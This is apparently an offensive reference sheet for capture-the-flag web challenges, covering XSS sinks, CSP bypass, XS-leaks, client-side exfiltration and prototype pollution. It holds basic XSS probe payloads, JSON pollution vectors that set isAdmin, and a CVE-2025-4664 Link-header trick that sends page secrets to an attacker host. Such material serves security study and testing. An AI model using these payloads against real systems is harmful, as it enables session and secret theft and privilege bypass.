# Browser and Client-Side Attacks

Use this reference for DOM and browser-side exploitation: XSS, DOM sinks, CSP bypass, client-side path abuse, XS-leaks, cache poisoning, and Node/prototype chains exposed through web apps.

## Table of Contents
- [Fast triage](#fast-triage)
- [XSS and DOM sinks](#xss-and-dom-sinks)
- [Client-side request abuse](#client-side-request-abuse)
- [CSP and sanitizer bypass](#csp-and-sanitizer-bypass)
- [Side channels and data exfiltration](#side-channels-and-data-exfiltration)
- [Node and prototype pollution](#node-and-prototype-pollution)
- [Framework notes](#framework-notes)

## Fast triage

Map browser attack surface in this order:
1. sources: URL, hash, query, postMessage, storage, WebSocket, JSON bootstrap, file metadata
2. sinks: `innerHTML`, jQuery selectors, template renderers, `eval`, framework escape hatches, URL navigators
3. controls: CSP, Trusted Types, sanitizer, MIME, cache, origin policy, bot/browser context
4. hidden state: JS bundles, source maps, DOM comments, non-rendered elements, client-side secrets

## XSS and DOM sinks

Start with context, not payload memorization.

High-yield sink families:
- reflected HTML insertion
- DOM XSS through `location.hash`, `postMessage`, or JSON parsing
- Shadow DOM and DOM clobbering
- `javascript:` scheme handling in bots or previewers
- MIME confusion where `.jpg`, `.svg`, or attachment names become active HTML

Minimal payload ladder:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Then move to context-specific bypasses only if needed.

## Client-side request abuse

Treat the browser as an API client you can reprogram.

Patterns:
- client-side path traversal (frontend builds `fetch("/api/" + id)`)
- parameter pollution where frontend and backend consume different values
- magic-link plus redirect chains
- cache poisoning via unkeyed headers or body/query mismatch
- request smuggling via browser/proxy desync in challenge infra

Always compare:
- what the browser sends,
- what the backend routes,
- what the cache keys on.

## CSP and sanitizer bypass

Common routes:
- whitelisted CDN behavior frameworks (`_hyperscript`, Alpine, htmx)
- missing `base-uri` enabling `<base>` hijack against nonced relative scripts
- trusted backend routes that bypass frontend sanitization
- whitelisted cloud-function domains serving attacker JS
- same-origin script gadgets with attacker-controlled MIME or content
- Unicode normalization mismatches between sanitizer and renderer

Rule:
- if script execution is blocked, switch to allowed script origin, declarative JS, or non-script exfil primitives.

## Side channels and data exfiltration

When JS exec is blocked, test read oracles instead.

Patterns:
- CSS-only exfiltration with fonts, width or container queries
- timing via image loads, cache state, or expensive prefix checks
- XS-leaks through redirects, load timing, or cross-window behavior
- XSSI / JSONP callback exfiltration
- hidden DOM or off-screen content harvesting

### Leaking a secret in the page URL (no script needed)

When a bot opens a URL containing a secret (OAuth `code`, reset token, query/fragment id) and you only control a sub-resource or sanitized `<img>`:
- Chrome `Link` referer leak (CVE-2025-4664, builds < 136.0.7103.113): the attacker sub-resource responds `Link: <//attacker/leak>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` → Chrome preloads with the **full Referer including query**. Only `<img src=//attacker/x>` is required on the victim page.
- `baseURI`/`srcdoc` inheritance: a sandboxed `srcdoc` reads the embedder's full URL; older Chrome leaks it cross-origin via session-history confusion (Chromium 41487933). Needs the victim framable.
- Cookie context decides the delivery: `SameSite=Lax`/unset cookies ride only **top-level** navigations/popups, never cross-site iframes or sub-resources — so make the bot mint the secret via top-level navigation, then read the resulting URL.
- These browser bugs are build-specific: pin the version from the Dockerfile, extract it, and reproduce locally with `--host-resolver-rules`/`--disable-popup-blocking` before firing.

## Node and prototype pollution

If the target is Node-based, audit merge and nest libraries before chasing classic XSS.

High-yield chains:
- prototype pollution -> app setting override -> auth or feature bypass
- pollution -> templating gadget -> AST/code execution
- pollution -> Happy-DOM / VM escape -> server-side JS execution
- vulnerable helpers: `flatnest`, old `lodash.merge`, deep-merge utilities

Common vectors:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Rule:
- separate the bug from the gadget. Pollution alone is not impact; identify what consumer reads from the prototype chain.

## Framework notes

Useful reminders:
- React controlled inputs need native setter + events, not plain `.value = ...`
- jQuery selector sinks still matter when hashchange or iframe tricks re-enable them
- Vue / template frameworks often expose constructor or render gadgets once escaping fails
- bot challenges often weaken normal browser assumptions: special URL schemes, relaxed CSP, print dialogs, hidden admin actions

## See also

- `field-notes.md` — fast XSS, SSTI, JWT, and traversal reminders
- `web-vulnerabilities-and-cves.md` — browser and framework CVEs
